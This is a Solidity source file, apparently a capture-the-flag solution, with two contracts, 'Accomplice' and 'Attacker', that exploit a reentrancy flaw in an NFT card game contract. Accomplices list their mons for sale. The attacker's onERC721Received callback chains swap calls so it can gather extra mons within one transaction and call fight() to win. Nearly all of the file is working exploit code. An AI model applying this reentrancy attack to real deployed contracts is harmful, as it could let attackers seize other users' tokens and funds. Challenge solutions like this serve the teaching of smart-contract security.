// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./Game.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

uint8 constant DECK_SIZE = 3;

// Those extra mons will be in our _balance after our 3 mons have been burned.
// 4 will ensure we win the fight.
uint8 constant EXTRA_MONS_NEEDED = 4;

// Number of accomplices required to get those EXTRA_MONS_NEEDED
uint8 constant ACCOMPLICE_SIZE = (EXTRA_MONS_NEEDED + DECK_SIZE - 1) / DECK_SIZE;

contract Accomplice is IERC721Receiver {

  Game immutable game;
  uint256[DECK_SIZE] deck;

  constructor(address _game) {
    game = Game(_game);
    deck = game.join();
    for (uint8 i; i < DECK_SIZE; i++) {
      game.putUpForSale(deck[i]);
    }
  }

  function swap(uint256 myMonIdIndex) external {
    uint256 myMonId = deck[myMonIdIndex];
    // Swapping a monId with the same monId ensures the transaction completes after we've won the fight,
    // since this mon will still be listed for sale
    game.swap(msg.sender, myMonId, myMonId);
  }

  function onERC721Received(address, address, uint256, bytes memory) public pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

}

contract Attacker is IERC721Receiver {

  Game immutable game;
  Accomplice[ACCOMPLICE_SIZE] accomplices;
  uint8 monsReceived;

  constructor(address _game, address[ACCOMPLICE_SIZE] memory _accomplices) {
    game = Game(_game);
    game.join();
    for (uint8 i; i < ACCOMPLICE_SIZE; i++) {
      accomplices[i] = Accomplice(_accomplices[i]);
    }
  }

  function attack() external {
    accomplices[0].swap(0);
  }

  // Called synchronously when an accomplice sends us one of their mon
  function onERC721Received(address, address, uint256, bytes memory) public override returns (bytes4) {
    //uint256 monsReceived = game.balanceOf(address(this)) - DECK_SIZE;
    monsReceived += 1;
    if (monsReceived >= EXTRA_MONS_NEEDED) {
      game.fight();
    } else {
      uint8 accompliceIndex = monsReceived / DECK_SIZE;
      uint8 accompliceMonIdIndex = monsReceived % DECK_SIZE;
      accomplices[accompliceIndex].swap(accompliceMonIdIndex);
    }
    return this.onERC721Received.selector;
  }

}
